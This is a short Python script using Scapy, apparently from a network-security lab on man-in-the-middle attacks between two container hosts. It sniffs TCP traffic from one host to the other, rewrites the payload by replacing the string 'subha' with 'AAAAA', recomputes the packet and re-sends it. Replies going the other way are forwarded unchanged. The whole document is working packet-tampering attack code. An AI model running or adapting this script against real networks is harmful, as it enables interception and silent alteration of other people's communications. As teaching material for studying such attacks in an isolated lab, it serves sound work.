#!/usr/bin/python3

from scapy.all import*
from time import *

IP_A = "10.9.0.5"
MAC_A= "02:42:0a:09:00:05"

IP_B = "10.9.0.6"
MAC_B= "02:42:0a:09:00:06"

def spoof_pkt(pkt):
    if pkt[IP].src == IP_A and pkt[IP].dst == IP_B and pkt[TCP].payload:
        print("Original Packet.....")
        print("Source IP : ", pkt[IP].src)
        print("Destination IP : ", pkt[IP].dst)

        data = pkt[TCP].payload.load
        newpkt = pkt[IP]

        del(newpkt.chksum)
        del(newpkt[TCP].chksum)
        del(newpkt[TCP].payload)

        newdata = data.replace(b'subha', b'AAAAA')
        newpkt = newpkt/newdata

        print("Spoofed Packet.....")
        print("Source IP : ", newpkt[IP].src)
        print("Destination IP : ", newpkt[IP].dst)

        send(newpkt)

    elif pkt[IP].src == IP_B and pkt[IP].dst == IP_A:
        print("Forwarding Packet.....")
        print("Source IP : ", pkt[IP].src)
        print("Destination IP : ", pkt[IP].dst)
        send(pkt[IP])

pkt= sniff(filter="tcp" , prn=spoof_pkt)
